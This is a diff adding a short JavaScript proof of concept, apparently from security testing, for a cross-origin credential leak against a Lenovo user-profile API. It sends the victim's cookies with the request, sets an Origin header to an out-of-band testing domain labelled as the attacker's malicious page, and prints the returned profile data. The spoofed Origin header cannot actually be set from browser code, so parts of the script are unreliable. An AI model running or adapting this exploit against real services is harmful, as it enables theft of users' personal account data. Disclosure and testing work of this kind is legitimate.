@@ -1,0 +1,16 @@
+fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+  method: 'GET',
+  headers: {
+    'Origin': 'https://gszrizdgtpjwtixdhtfmpe9fvqozas2ny.oast.fun',  // origin of your malicious page
+    'Accept': 'application/json',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'cross-site',
+    'Sec-Fetch-Dest': 'empty',
+  },
+  credentials: 'include'  // Ensures cookies are sent
+})
+.then(response => response.json())
+.then(data => {
+  console.log(data);
+})
+.catch(error => console.error('Error:', error));
